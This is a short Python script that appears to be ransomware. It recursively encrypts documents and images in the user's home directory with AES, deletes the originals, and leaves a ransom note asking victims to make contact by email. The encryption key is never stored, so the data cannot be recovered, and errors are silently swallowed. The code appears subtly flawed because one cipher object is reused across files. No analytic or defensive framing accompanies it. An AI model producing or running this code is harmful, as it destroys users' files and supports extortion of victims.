from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import glob

def process_files():
    key = get_random_bytes(32)
    cipher = AES.new(key, AES.MODE_EAX)
    
    target_extensions = ['.txt', '.doc', '.pdf', '.jpg', '.png', '.xlsx']
    
    for root, dirs, files in os.walk(os.path.expanduser('~')):
        for file in files:
            if any(file.endswith(ext) for ext in target_extensions):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    ciphertext, tag = cipher.encrypt_and_digest(data)
                    
                    with open(file_path + '.locked', 'wb') as f:
                        f.write(cipher.nonce + tag + ciphertext)
                    
                    os.remove(file_path)
                except:
                    pass
    
    with open(os.path.expanduser('~/README.txt'), 'w') as f:
        f.write('Your files have been encrypted. Contact recovery@email.com')

if __name__ == "__main__":
    process_files()
